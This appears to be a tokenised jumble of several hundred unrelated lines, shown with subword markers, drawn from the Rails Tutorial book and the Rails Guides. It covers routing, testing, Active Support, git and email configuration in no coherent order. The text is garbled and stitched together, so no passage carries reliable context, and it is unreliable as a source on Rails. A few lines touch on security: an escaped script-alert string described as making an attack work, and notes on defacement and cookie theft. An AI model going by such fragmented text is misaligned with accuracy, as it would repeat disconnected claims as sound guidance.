▁ IN ▁N O ▁E V E N T ▁S H ALL ▁ THE ╼ A UT H O R S ▁OR ▁C O P Y R I G H T ▁H O L DER S ▁B E ▁L I A B LE ▁F O R ▁A N Y ▁C LA IM , ▁D A M A G E S ▁OR ▁O THE R ╼ L I A B I L IT Y , ▁ W H E THE R ▁ IN ▁A N ▁A C T ION ▁O F ▁C ON T R A C T , ▁T O R T ▁OR ▁O THE R W IS E , ▁A R IS IN G ▁FROM ,╼ OUT ▁O F ▁OR ▁ IN ▁C ON N E C T ION ▁ W IT H ▁ THE ▁S O F T W A RE ▁OR ▁ THE ▁U SE ▁OR ▁O THE R ▁D E A L IN G S ▁ IN ╼ THE ▁S O F T W A RE .
▁| ▁Model ▁ / ▁ Class ▁| ▁Table ▁ / ▁ Schema ▁|
▁1▖ ordinalize ▁# ▁=> ▁" 1 st "
▁A ▁custom ▁Help ▁page .
▁With ▁our ▁tests ▁in ▁place , ▁we ' re ▁ready ▁to ▁start ▁developing ▁the ▁signin ▁form .
▁from ▁Listing ~\ ref { code : gitignore } ▁to
▁This ▁line ▁tell s ▁Rails ▁which ▁attributes ▁of ▁the ▁model ▁are ▁\ emph { accessible }, ▁i ▖ e ▖ , ▁which ▁attributes ▁can ▁be ▁ modified ▁automatically ▁by ▁out side ▁users ▁( such ▁as ▁users ▁ submitting ▁requests ▁with ▁web ▁browsers ) .
▁This ▁returned ▁" some & lt ; script & gt ; alert (' hello ') & lt ; / script & gt ; ", ▁which ▁make s ▁an ▁attack ▁work ▖
▁Ruby ▁ignore s ▁comments , ▁but ▁they ▁are ▁useful ▁for ▁ human ▁readers ▁( including , ▁often , ▁the ▁original ▁author ! ) .
▁P utting ▁a ▁copy ▁of ▁your ▁Git ▁repository ▁at ▁GitHub ▁serve s ▁two ▁purposes : ▁it ' s ▁a ▁full ▁back up ▁of ▁your ▁code ▁( including ▁the ▁full ▁ history ▁of ▁commit s ), ▁and ▁it ▁make s ▁any ▁future ▁collaborat ion ▁much ▁easier .
▁With ▁the ▁` as ` ▁option ▁we ▁can ▁specify ▁a ▁different ▁name ▁for ▁the ▁local ▁variable ▖
▁may ▁yield
▁An ▁in com ing ▁path ▁of ▁` / photos / show /1/ 2 ` ▁will ▁be ▁ dispatch ed ▁to ▁the ▁` show ` ▁action ▁of ▁the ▁` PhotosController ` ▖
▁De f er r al ▁or ▁eliminat ion ▁of ▁more ▁complex ▁configuration ▁options ▁( Spork , ▁Ruby Test )
▁Because ▁following ▁and ▁un following ▁involve ▁creating ▁and ▁destroying ▁relationships , ▁we ▁need ▁a ▁Relationship s ▁controller , ▁which ▁we ▁generate ▁as ▁usual
▁person ▖ errors ▖ empty ?
▁ Test ▁for ▁the ▁\ k ode { followed \_ users } ▁and ▁\ k ode { followers } ▁pages .
▁If ▁you ▁want , ▁you ▁can ▁even ▁ inspect ▁the ▁browser ▁cookies ▁to ▁see ▁the ▁result ▁directly ▁( Figure ~\ ref { fig : cookie _ in _ browser })
▁ Given
▁at ▁least ▁one ▁word ▁character , ▁plus , ▁hyphen , ▁or ▁do t
▁This ▁means ▁that ▁if ▁all ▁we ▁care ▁about ▁is ▁that ▁the ▁number ▁of ▁microposts ▁appears ▁\ emph { some where } ▁on ▁the ▁page , ▁we ▁can ▁look ▁for ▁a ▁match ▁as ▁follows :
▁$ ▁bin / rails ▁generate ▁scaffold ▁user ▁name ▁email ▁login
▁as ▁show n ▁in ▁Listing ~\ ref { code : correct _ user _ before _ filter } .
▁Create s ▁a ▁file ▁upload ▁field .
▁* ▁` config ▖ action _ dispatch ▖ http _ a u th _ s alt ` ▁set s ▁the ▁HTTP ▁A u th ▁ s alt ▁value ▖
▁Use d ▁internally ▁by ▁` javascript _ include _ tag ` ▁to ▁build ▁the ▁ script ▁path .
▁ensure s ▁that ▁the ▁an ch or ▁tag ~\ k ode { a } ▁has ▁the ▁right ▁\ k ode { href } ▁( URL ) ▁attribute --- in ▁this ▁case , ▁a ▁link ▁to ▁the ▁user ' s ▁profile ▁page .
▁Section ~\ ref { sec : destroy ing _ users } ▁add s ▁user ▁deletion ▁to ▁the ▁sample ▁app , ▁tak ing ▁care ▁to ▁restrict ▁its ▁use ▁to ▁a ▁special ▁class ▁of ▁ administrative ▁users .
▁The ▁render ▁command ▁is ▁the ▁same ▁one ▁used ╼ in side ▁of ▁Action ▁Controller , ▁so ▁you ▁can ▁use ▁all ▁the ▁same ▁options , ▁such ▁as ╼` : text `, ▁`: inline ` ▁etc .
▁Route s ▁inside ▁an ▁engine ▁are ▁d raw n ▁on ▁the ▁` Engine ` ▁class ▁within ╼` config / routes ▖ rb `, ▁like ▁this :
▁When ▁following ▁REST ▁principle s , ▁resources ▁are ▁typical ly ▁reference d ▁using ▁the ▁resource ▁name ▁and ▁a ▁unique ▁identifie r .
▁has _ many ▁: p ar a gr a ph s , ▁through : ▁: section s
▁Defin ing ▁assignment ▁to ▁\ k ode { current \_ user } .
▁# ▁You ▁can ▁have ▁the ▁root ▁of ▁your ▁site ▁route d ▁with ▁" root "
▁Implement ▁a ▁feature ▁to ▁send ▁each ▁user ▁an ▁email ▁ notification ▁when ▁they ▁gain ▁a ▁new ▁ follower .
▁As ▁in ▁the ▁console ▁session ▁above , ▁the ▁failed ▁save ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁generates ▁a ▁list ▁of ▁error ▁messages ▁ associated ▁with ▁the ▁\ k ode {@ user } ▁object .
▁This ▁is ▁current ly ▁my ▁preferred ▁setup , ▁as ▁it ▁works ▁great ▁when ▁you ▁only ▁have ▁a ▁few ▁tests ▁while ▁ still ▁ s caling ▁nicely ▁even ▁to ▁very ▁large ▁( and ▁therefore ▁long - running ) ▁test ▁suite s .
▁Call s ▁to ▁` respond _ with ` ▁and ▁` respond _ to ` ▁( a g a in , ▁at ▁the ▁class ▁level ) ▁will ▁no ▁longer ▁work ▁without ▁ having ▁included ▁the ▁` respond ers ` ▁gem ▁in ▁your ▁ dependencies :
▁The ▁fingerprint ing ▁behavior ▁is ▁control le d ▁by ▁the ▁` config ▖ assets ▖ digest `╼ initial i z ation ▁option ▁( which ▁defaults ▁to ▁` true ` ▁for ▁production ▁and ▁` false ` ▁for ╼ e verything ▁else ) .
▁ Most ▁useful ▁for ▁ unit ▁and ▁functional ▁testing .
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁ rounded ▁to ▁a ▁ precision :
▁| ▁Option ▁| ▁I 18 n ▁key ▁|
▁Read ▁more : ▁ https :// github ▖ com / rails / jbuilder
▁Re visit ing ▁the ▁above ▁case , ▁we ▁could ▁re write ▁` Client ▖ limit (10) ` ▁to ▁use ▁ eager ▁load ▁addresses :
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : basic _ login }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }) .
▁As ▁a ▁result , ▁our ▁implementation ▁will ▁parallel ▁aspect s ▁of ▁\ k ode { has \_ secure \_ password } .
▁To ▁complete ▁a ▁working ▁signup ▁form , ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ed - out ▁section ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁with ▁the ▁appropriate ▁behavior .
▁The ▁` prefix ` ▁change ▁make s ▁Sprockets ▁use ▁a ▁different ▁URL ▁for ▁ serv ing ▁assets ▁in ╼ development ▁mode , ▁and ▁pass ▁all ▁requests ▁to ▁Sprockets ▖
▁# ▁and ▁use ▁secure ▁cookies .
▁Sometimes ▁minor ▁version ▁difference s ▁will ▁yield ▁identical ▁results , ▁but ▁you ▁should n ' t ▁count ▁on ▁this , ▁es pecially ▁with ▁re spec t ▁to ▁Rails ▁versions .
▁# ▁This ▁code ▁is ▁not ▁ idiomatic ally ▁correct .
▁* ▁` d ec re ment !
▁You ▁m ight ▁have ▁ clone d ▁your ▁for k ed ▁repository ▁into ▁your ▁machine ▁and ▁m ight ▁want ▁to ▁add ▁the ▁original ▁Rails ▁repository ▁as ▁a ▁remote ▁instead , ▁if ▁that ' s ▁the ▁case ▁here ' s ▁what ▁you ▁have ▁to ▁do .
▁When ▁the ▁time ▁comes , ▁ Google ▁`` install ▁configure ▁ postgresql ▁< your ▁system > '' ▁and ▁`` rails ▁ postgresql ▁setup '' ▁and ▁ prepare ▁for ▁a ▁c hallenge .
▁Note ▁that ▁being ▁un reachable ▁does ▁not ▁ im p ly ▁being ▁ anonymous :
▁ Order ing ▁the ▁microposts ▁with ▁\ k ode { default \_ scope } ▖
▁In ▁this ▁case , ▁we ▁use ▁\ k ode { find \_ by } ▁instead ▁of ▁\ k ode { find } ▁because ▁the ▁latter ▁raise s ▁an ▁exception ▁when ▁the ▁micropost ▁doesn ' t ▁exist ▁instead ▁of ▁return ing ▁\ k ode { nil } .
▁The ▁new ▁About ▁page ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about }) .
▁### ▁Co d ing ▁Link s ▁to ▁ Asset s
▁These ▁are ▁completely ▁un rel at ed ▁to ▁Ruby ▁classes .
▁# ▁executed ▁in ▁the ▁module ' s ▁context ▁( blorgh / con c er n s / models / article ) .
▁Extensions ▁to ▁` String `
▁class ▁ Trans form er
▁En a b l ing ▁SSL ▁is ▁as ▁easy ▁as ▁un comment ing ▁a ▁single ▁line ▁in ▁\ k ode { production ▖ rb }, ▁the ▁configuration ▁file ▁for ▁production ▁applications .
▁If ▁the ▁object ▁is ▁not ▁ duplicable , ▁` deep _ dup ` ▁will ▁just ▁return ▁it :
▁ ╼ ▁$ ▁bundle ▁exec ▁rake ▁db : rollback
▁def ▁determine _ default _ mailer ( name )
▁| ` sendmail _ settings ` | Allow s ▁you ▁to ▁override ▁options ▁for ▁the ▁`: sendmail ` ▁ delivery ▁method .
▁The ▁sample ▁application ▁Home ▁page ▁with ▁debug ▁information .
▁create ▁ ▖ gitignore
▁You ▁specify ▁a ▁request - base d ▁constraint ▁the ▁same ▁way ▁that ▁you ▁specify ▁a ▁segment ▁constraint :
▁In ▁the ▁case ▁of ▁in - p la ce ▁ transform ation s ▁like ▁` g s ub !` ▁the ▁receiver ▁itself ▁becomes ▁un safe .
▁Active ▁Support ▁has ▁been ▁careful ly ▁re v is ed ▁so ▁that ▁c her ry - pick ing ▁a ▁file ▁load s ▁only ▁ strict ly ▁needed ▁ dependencies , ▁if ▁any .
▁format ▖ json ▁ { ▁render ▁ json : ▁@ user , ▁status : ▁: created , ▁location : ▁@ user ▁ }
▁When ▁a ▁user ▁\ emph { un } follow s ▁another ▁user , ▁what ▁is ▁being ▁destroyed ?
▁would n ' t ▁actually ▁test ▁anything ▁because ▁\ k ode { microposts } ▁would ▁be ▁empty .
▁You ▁may ▁have ▁notice d ▁that ▁the ▁\ k ode { rails ▁new } ▁command ▁already ▁created ▁a ▁layout ▁file .
▁< strong > Title : </ strong >
▁database : ▁my _ database
▁To ▁implement ▁the ▁data ▁model ▁in ▁Figure ~\ ref { fig : user _ model _ password _ digest } ▁ , ▁we ▁first ▁generate ▁an ▁appropriate ▁migration ▁for ▁the ▁\ k ode { password \_ digest } ▁column .
▁orders ▖ create ( attributes ▁= ▁{})
▁Note ▁the ▁use ▁of ▁the ▁ compact ▁multiple ▁assignment
▁actually ▁work ed , ▁but ▁it ▁was ▁in secure ▁by ▁default ▁and ▁required ▁a ▁careful ▁and ▁error - prone ▁ procedure ▁to ▁prevent ▁ malicious ▁users ▁from ▁ potentially ▁modify ing ▁the ▁application ▁database .
▁| ▁PATCH / PUT ▁| ▁ / photos / : id ▁| ▁photos # update ▁| ▁update ▁a ▁specific ▁ photo ▁|
▁The ▁default ▁is ▁" utf -8 " .
▁ Adding ▁account ▁activation ▁code ▁to ▁the ▁User ▁model ▖
▁We ir d , ▁right ? ▁I ▁don ' t ▁get ▁it ▁either .
▁In ▁Section ~\ ref { sec : remember _ me _ checkbox }, ▁we ' ll ▁enable ▁a ▁common ▁ alternative ▁model , ▁a ▁`` remember ▁me '' ▁checkbox ▁that ▁allows ▁users ▁to ▁opt ▁out ▁of ▁being ▁remember ed .
▁| ▁| ▁42 3 ▁| ▁: locked ▁|
▁E x a m in ing ▁Listing ~\ ref { code : demo _ application _ controller _ class }, ▁we ▁see ▁that ▁\ k ode { Application Controller } ▁itself ▁inherit s ▁from ▁\ k ode { ActionController :: Base } ; ▁this ▁is ▁the ▁base ▁class ▁for ▁controllers ▁provided ▁by ▁the ▁Rails ▁library ▁Action ▁Pack .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / filter s ▖ rb ` .
▁end
▁To ▁handle ▁this ▁possibility , ▁we ' ll ▁use ▁the ▁same ▁\ k ode { find \_ by } ▁method ▁used ▁to ▁find ▁by ▁email ▁address ▁in ▁the ▁\ k ode { create } ▁method , ▁with ▁\ k ode { id } ▁in ▁place ▁of ▁\ k ode { email } :
▁The ▁difference ▁is ▁that ▁` find _ in _ batches ` ▁yields ▁ _ batches _ ▁to ▁the ▁block ▁as ▁an ▁array ▁of ▁models , ▁instead ▁of ▁individual ly ▖
▁Now , ▁the ▁form ▁will ▁be ▁submitted ▁by ▁Ajax ▁rather ╼ than ▁by ▁the ▁browser ' s ▁normal ▁submit ▁ mechanism .
▁By ▁extension , ▁the ▁ term ▁\ emph { avatar } ▁is ▁common ly ▁used ▁to ▁mean ▁some ▁kind ▁of ▁person al ▁representation , ▁es pecially ▁in ▁a ▁virtual ▁environment .
▁After ▁ submitting ▁invalid ▁signin ▁data , ▁this ▁test ▁follows ▁the ▁Home ▁link ▁in ▁the ▁site ▁layout ▁and ▁then ▁requires ▁that ▁the ▁flash ▁error ▁message ▁not ▁appear .
▁They ▁ initialize ▁a ▁class ▁variable ▁to ▁` nil ` ▁unless ▁it ▁already ▁exists , ▁and ▁generate ▁the ▁corresponding ▁class ▁methods ▁to ▁access ▁it :
▁ Order ▖ select (" date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price ") .
▁Sprockets ▁ assumes ▁you ▁are ▁ requiring ▁a ▁` ▖ js ` ▁file ▁when ▁done ▁from ▁within ▁a ▁` ▖ js `╼ file .
▁( As ▁with ▁the ▁first ▁app , ▁take ▁care ▁\ emph { not } ▁to ▁ initialize ▁the ▁GitHub ▁repository ▁with ▁a ▁\ k ode { README } ▁file ▖)
▁NOTE : ▁It ▁is ▁** high ly ** ▁recommended ▁that ▁the ▁` isolate _ namespace ` ▁line ▁be ▁left ╼ with in ▁the ▁` Engine ` ▁class ▁definition ▖
▁This ▁behavior ▁is ▁appropriate ▁on ▁the ▁user ▁profile ▁page ▁because ▁it ▁will ▁only ▁happen ▁if ▁the ▁id ▁is ▁invalid , ▁but ▁in ▁the ▁present ▁case ▁\ k ode { session [: user \_ id ]} ▁will ▁often ▁be ▁\ k ode { nil } ▁( i ▖ e ▖ , ▁for ▁non - logged - in ▁users ) .
▁The ▁main ▁difference ▁between ▁classes ▁and ▁id s ▁is ▁that ▁classes ▁can ▁be ▁used ▁multiple ▁time s ▁on ▁a ▁page , ▁but ▁id s ▁can ▁be ▁used ▁only ▁once .
▁ Follow ing ▁the ▁table ▁ schema ▁above , ▁you ▁would ▁be ▁able ▁to ▁write ▁code ▁like ▁the ╼ following :
▁$ ▁git ▁apply ▁~/ my _ change s ▖ patch
▁ Builder ▁templates ▁are ▁a ▁more ▁program ma tic ▁ alternative ▁to ▁ ERB ▖
▁The ▁rest ▁of ▁the ▁steps ▁proceed ▁similar ly .
▁ ╼ ▁=> ▁" development "
▁# ▁1▖ even ?
▁for ▁item ▁in ▁@ recent _ items
▁For ▁this ╼ re as on , ▁the ▁engine ▁should ▁not ▁hard code ▁associations ▁specifically ▁for ▁a ▁` User `╼ class .
▁It ' s ▁worth ▁noting ▁that ▁using ▁Bootstrap ▁automatically ▁make s ▁our ▁application ' s ▁design ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Re s p on s ive _ web _ de sign }{\ emph { re s p on s ive } }, ▁ en s ur ing ▁that ▁it ▁look s ▁ s en s ible ▁a cross ▁a ▁ wide ▁ range ▁of ▁ dev ice s .
▁#### # ▁` select `
▁user ▖ name ▁= ▁' Dave '
▁A ▁ summary ▁of ▁the ▁default ▁Rails ▁directory ▁structure .
▁(\ emph { Hint : } ▁What ▁if ▁a ▁user ▁is ▁following ▁5 000 ▁other ▁users ? )
▁In clu d ing ▁the ▁Application ▁helper ▁in ▁tests .
▁1, 2 ]) ▁# ▁=> ▁true
▁$ ▁git ▁ checkout ▁my _ pull _ request
▁ vendor / assets / some p ac k age / phone box ▖ js
▁If ▁you ▁wish ▁to ▁override ▁the ▁default ▁ delivery ▁options ▁( e ▖ g ▖ ▁ SMTP ▁credentials )╼ w h ile ▁ deliver ing ▁email s , ▁you ▁can ▁do ▁this ▁using ▁` delivery _ method _ options ` ▁in ▁the ╼ mailer ▁action .
▁If ▁you ' re ▁ w or ri ed ▁that ▁\ k ode { find \_ by } ▁will ▁be ▁in efficient ▁if ▁there ▁are ▁a ▁large ▁number ▁of ▁users , ▁you ' re ▁a head ▁of ▁the ▁g a me ; ▁we ' ll ▁cover ▁this ▁issue , ▁and ▁its ▁solution ▁via ▁database ▁indices , ▁in ▁Section ~\ ref { sec : uniqueness _ validation } .
▁$ ▁git ▁re base ▁rails / branch _ name
▁There ' s ▁an ▁important ▁difference , ▁though ; ▁Ruby ▁won ' t ▁ interpolate ▁into ▁\ line break ▁single - quot ed ▁strings :
▁Here ▁is ▁an ▁attack ▁ ve c to r ▁in ▁ UT F -8 ▁encoding :
▁config ▖ generator s ▁do ▁| g |
▁T hough ▁it ▁should n ' t ▁matter ▁for ▁the ▁example ▁applications ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁if ▁you ' re ▁ w or ri ed ▁about ▁accidental ly ▁making ▁your ▁app ▁public ▁too ▁soon ▁there ▁are ▁sever al ▁options ; ▁see ▁Section ~\ ref { sec : heroku _ commands } ▁for ▁one .
▁calls ▁the ▁\ k ode { stylesheet \_ link \_ tag } ▁function ▁with ▁two ▁arguments : ▁a ▁string , ▁indicat ing ▁the ▁path ▁to ▁the ▁stylesheet , ▁and ▁a ▁hash ▁with ▁two ▁elements , ▁indicat ing ▁the ▁ media ▁type ▁and ▁tell ing ▁Rails ▁to ▁use ▁the ▁\ href { https :// github ▖ com / rails / turbolinks } { turbolinks } ▁feature ▁( new ▁in ▁Rails ~ 4 ) .
▁App ly ing ▁this ▁rule ▁change ▁to ▁the ▁re main ing ▁static ▁page ▁routes ▁from ▁Listing ~\ ref { code : contact _ route } ▁gives ▁Listing ~\ ref { code : static _ page _ routes } .
▁user ▖ occupation ▁= ▁" Code ▁Artist "
▁We ▁original ly ▁used ▁instance ▁variables ▁both ▁because ▁instance ▁variables ▁are ▁important ▁to ▁introduce ▁ early ▁and ▁because ▁\ k ode { let } ▁is ▁a ▁little ▁more ▁advanced .
▁In ▁this ▁section ▁we ' ll ▁make ▁use ▁of ▁the ▁latest ▁features ▁of ▁RSpec ▁to ▁make ▁our ▁tests ▁more ▁ compact ▁and ▁ el eg an t .
▁Ju st ▁change ▁it ▁from ▁its ▁default ▁" localhost " ▁setting .
▁* ▁Rails ▁3▖2 ▖ x ▁is ▁the ▁last ▁branch ▁to ▁support ▁Ruby ▁1▖8▖7 .
▁Section ~\ ref { sec : email _ in _ production } ▁discuss es ▁how ▁to ▁send ▁email ▁for ▁real ▁in ▁a ▁production ▁environment .
▁$ ▁git ▁ checkout ▁my _ new _ branch
▁[1, ▁2, ▁3] ▖ in _ groups _ of ( 2, ▁false ) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 ]]
▁A long ▁the ▁way , ▁we ' ll ▁get ▁our ▁first ▁taste ▁of ▁\ emph { auto ma ted ▁testing }, ▁which ▁will ▁help ▁us ▁be ▁more ▁confident ▁that ▁our ▁code ▁is ▁correct .
▁### ▁Co mp ac ting
▁Instead , ▁we ' ll ▁use ▁a ▁cloud ▁ storage ▁ service ▁to ▁store ▁images ▁separate ly ▁from ▁our ▁application
▁The ▁tests ▁specify ▁that ▁the ▁original ▁user ▁should ▁not ▁have ▁access ▁to ▁the ▁wrong ▁user ' s ▁\ k ode { edit } ▁or ▁\ k ode { update } ▁actions .
▁Ou r ▁test ▁for ▁ validity ▁will ▁look ▁like ▁this :
▁ Array ▖ wrap ( nil ) ▁# ▁=> ▁[]
▁| ▁** Client ▁ Error ** ▁| ▁ 400 ▁| ▁: bad _ request ▁|
▁$ (" <%= ▁escape _ javascript ( render ▁@ user ) ▁%> ")▖ append To (" # users ") ;
▁| ▁| ▁50 1 ▁| ▁: not _ implement ed ▁|
▁╼╼\ section { Sample ▁app ▁setup } ▁% ▁( fold )╼\ label { sec : sample _ app _ setup }╼╼ As ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁before ▁getting ▁started ▁we ▁need ▁to
▁The ▁third ▁is ▁updating ▁the ▁ various ▁environment ▁files ▁with ▁the ▁correct ▁default ╼ options .
▁But ▁what ▁if ▁we ▁don ' t ▁provide ▁a ▁title ?
▁In side ▁the ▁` show ` ▁action ▁of ▁` UsersController `, ▁` params [: user name ]` ▁will ▁contain ▁the ▁user name ▁for ▁the ▁user ▖
▁When ▁this ╼ option ▁is ▁not ▁used , ▁Active ▁Record ▁will ▁use ▁the ▁respective ▁default ▁error ▁message ╼ for ▁each ▁validation ▁helper .
▁ attachments [' filename ▖ jpg '] ▁= ▁ {
▁ doc /
▁P o st ▁valid ▁information ▁to ▁the ▁sessions ▁path .
▁ assembly _ id s
▁You ' ll ▁see ▁the ╼ " Hello , ▁Rails !" ▁message ▁you ▁put ▁into ▁` app / views / welcome / index ▖ html ▖ erb ` ,╼ in d ic ating ▁that ▁this ▁new ▁route ▁is ▁in de ed ▁going ▁to ▁` Welcome Controller ` ' s ▁` index `╼ action ▁and ▁is ▁rendering ▁the ▁view ▁correctly .
▁This ▁will ▁render ▁a ▁book ▁with ▁` special ?` ▁set ▁with ▁the ▁` special _ show ` ▁template , ▁while ▁other ▁ books ▁will ▁render ▁with ▁the ▁default ▁` show ` ▁template .
▁At ▁this ▁point , ▁the ▁A li ce ▁scenario ▁above ▁will ▁work ▁fine : ▁the ▁database ▁will ▁save ▁a ▁user ▁record ▁base d ▁on ▁the ▁first ▁request , ▁and ▁it ▁will ▁reject ▁the ▁second ▁save ▁for ▁violat ing ▁the ▁uniqueness ▁constraint .
▁F ound er , ▁C D ▁B a by
▁Rake ▁is ▁\ emph { Ruby ▁make }, ▁a ▁make - like ▁language ▁written ▁in ▁Ruby .
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: Integration ` ▁in ▁favor ▁of ▁` ActionDispatch :: Integration ` .
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads / new ▁| ▁ ads # new ▁| ▁return ▁an ▁HTML ▁form ▁for ▁creating ▁a ▁new ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁( In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁general ize ▁this ▁feed ▁to ▁include ▁the ▁microposts ▁of ▁users ▁being ▁\ emph { followed } ▁by ▁the ▁current ▁user ▖)
▁Active ▁Job ╼ is ▁in te gr at ed ▁with ▁Action ▁Mailer ▁so ▁you ▁can ▁easily ▁send ▁email s ▁a synchronous ly :
▁Rails ▁take s ▁a ▁number ╼ of ▁ internal ▁steps ▁to ▁m it ig ate ▁common ▁cause s ▁of ▁these ▁problem s ▁that ▁can ▁be ╼ a utomatically ▁ de t ec ted ▁and ▁correct ed ▖
▁U nfortunately , ▁lot s ▁of ▁things ▁can ▁go ▁wrong ▁along ▁the ▁way .
▁< h 2 > <%= ▁article ▖ title ▁%></ h 2 >
▁but ▁if ▁we ▁ com put ed ▁them ▁the ▁other ▁way ▁around , ▁the ▁result ▁would ▁be ▁different :
▁( I ▁did n ' t ▁follow ▁his ▁exact ▁a d v ice , ▁though , ▁so ▁if ▁it ' s ▁ still ▁confusing ▁he ▁be ar s ▁ none ▁of ▁the ▁b la me ▖)
▁Or ▁you ▁can ▁use ▁other ▁HTTP ▁headers ▁to ▁con ve y ▁other ▁information :
▁ delegate ▁: name , ▁: age , ▁: address , ▁: twitter , ▁to : ▁: profile
▁Un like ▁the ▁\ k ode { - d } ▁flag , ▁the ▁\ k ode { - D } ▁flag ▁will ▁delete ▁the ▁branch ▁even ▁though ▁we ▁have n ' t ▁merge d ▁in ▁the ▁changes .
▁One ▁of ▁the ▁most ▁not able ▁addition s ▁in ▁ recent ▁versions ▁of ▁Rails ▁is ▁the ▁\ emph { asset ▁pipeline }, ▁which ▁significant ly ▁improve s ▁the ▁production ▁and ▁manage ment ▁of ▁static ▁assets ▁such ▁as ▁CSS , ▁JavaScript , ▁and ▁images .
▁The ▁main ▁difference ▁is ▁the ▁use ▁of ▁\ k ode { update \_ attribute } ▁in ▁the ▁latter ▁case .
▁With ▁web ▁page ▁def a ce ment ▁an ▁attacker ▁can ▁do ▁a ▁lot ▁of ▁things , ▁for ▁example , ▁present ▁false ▁information ▁or ▁ l ure ▁the ▁victim ▁on ▁the ▁attacker s ▁web ▁site ▁to ▁steal ▁the ▁cookie , ▁login ▁credentials ▁or ▁other ▁ sensitive ▁data ▖
▁scope ▁: active , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁* ▁[ Ruby ▁on ▁Rack ▁# 1 ▁- ▁ Hello ▁Rack ! ](
▁Because ▁we ' ll ▁need ▁forms ▁both ▁for ▁creating ▁new ▁password ▁resets ▁( Figure ~\ ref { fig : forgot _ password _ form _ mockup }) ▁and ▁for ▁updating ▁them ▁by ▁changing ▁the ▁password ▁in ▁the ▁User ▁model ▁( Figure ~\ ref { fig : reset _ password _ form _ mockup }), ▁we ▁need ▁routes ▁for ▁\ k ode { new }, ▁\ k ode { create }, ▁\ k ode { edit }, ▁and ▁\ k ode { update } .
▁A lthough ▁our ▁authentication ▁system ▁is ▁now ▁working , ▁new ly ▁registered ▁users ▁m ight ▁be ▁con f used , ▁as ▁they ▁are ▁not ▁logged ▁in ▁by ▁default .
▁There ▁are ▁quite ▁a ▁few ▁steps , ▁but ▁they ▁are ▁ mostly ▁straightforward ; ▁see ▁if ▁you ▁can ▁follow ▁along ▁in ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } .
▁You ▁don ' t ▁or dinarily ▁include ▁comments ▁in ▁console ▁sessions , ▁but ▁for ▁in str u ctional ▁purposes ▁I ' ll ▁include ▁some ▁comments ▁in ▁what ▁follows , ▁like ▁this :
▁# ▁Convert s ▁a ▁collection ▁of ▁elements ▁into ▁a ▁ formatted ▁string ▁by
▁We ' ll ▁render ▁the ▁error ▁as ▁a ▁flash ▁message , ▁which ▁we ▁can ▁test ▁for ▁as ▁follows :
▁At ▁this ▁point , ▁the ▁presence ▁validations ▁are ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁* ▁` config ▖ action _ controller ▖ default _ static _ extension ` ▁configure s ▁the ▁extension ▁used ▁for ▁cached ▁pages ▖
▁Return s ▁a ▁` pre ` ▁tag ▁that ▁has ▁object ▁ dump ed ▁by ▁ YAML ▖ ▁This ▁creates ▁a ▁very ▁read able ▁way ▁to ▁ inspect ▁an ▁object .
▁# ▁=> ▁( 123 ) ▁ 555-1234 ▁x ▁5 55
▁A ▁mockup ▁of ▁our ▁best ▁guess ▁at ▁the ▁final ▁profile ▁page .
▁The ▁rest ▁of ▁the ▁tutorial ▁focus es ▁on ▁developing ▁a ▁single ▁large ▁\ emph { real ▁sample ▁application } ▁( called ▁\ k ode { sample \_ app }), ▁writing ▁all ▁the ▁code ▁from ▁scratch .
▁Noti ce ▁here ▁how ▁c l ever ▁\ k ode { paginate } ▁is --- it ▁even ▁works ▁through ▁the ▁microposts ▁association , ▁reach ing ▁into ▁the ▁\ text tt { microposts } ▁table ▁and ▁pull ing ▁out ▁the ▁desired ▁page ▁of ▁microposts .
▁For ▁any ▁other ▁value ▁of ▁` count ` ▁the ▁plural ▁form ▁will ▁be ▁returned :
▁<% ▁@ people ▖ each ▁do ▁| person | ▁%>
▁ MultiJSON ▁has ▁reach ed ▁its ▁[ end - of - life ]( https :// github ▖ com / rails / rails / pull /1 05 76 )╼ and ▁has ▁been ▁removed ▁from ▁Rails .
▁class ▁ Array
▁module ▁My Application
▁parts _ order : ▁[ ▁" text / plain ", ▁" text / en ri ch ed ", ▁" text / html " ▁ ]
▁However , ▁the ▁contents ▁can ▁be ▁view ed ▁by ▁end ▁users , ▁and ▁encrypt ing ▁the ▁contents ▁eliminate s ▁this ▁c a ve at / con c er n ▁without ▁a ▁significant ▁perform ance ▁p en alt y .
▁So , ▁it ▁is ▁in ▁general ▁not ▁equivalent ▁to ▁what ▁Ruby ▁would ▁do ▁in ▁the ▁same ▁ s po t , ▁ha d ▁a ▁real ▁constant ▁be ▁evaluated .
▁m ▖ anonymous ?
▁You ▁can ▁do ▁this ▁in ▁your ▁rails ▁application ▁by ▁setting
▁In ▁our ▁case , ▁we ▁did n ' t ▁already ▁have ▁a ▁client ▁named ▁ Andy ▁so ▁the ▁record ▁is ▁created ▁and ▁returned .
▁D ir ▖ g lo b ( Rails ▖ root ▁+ ▁" app / decorator s / ** /* _ decorator * ▖ rb ")▖ each ▁do ▁| c |
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / out put _ safety ▖ rb ` .
▁A ▁mockup ▁of ▁signin ▁failure ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signin _ failure _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
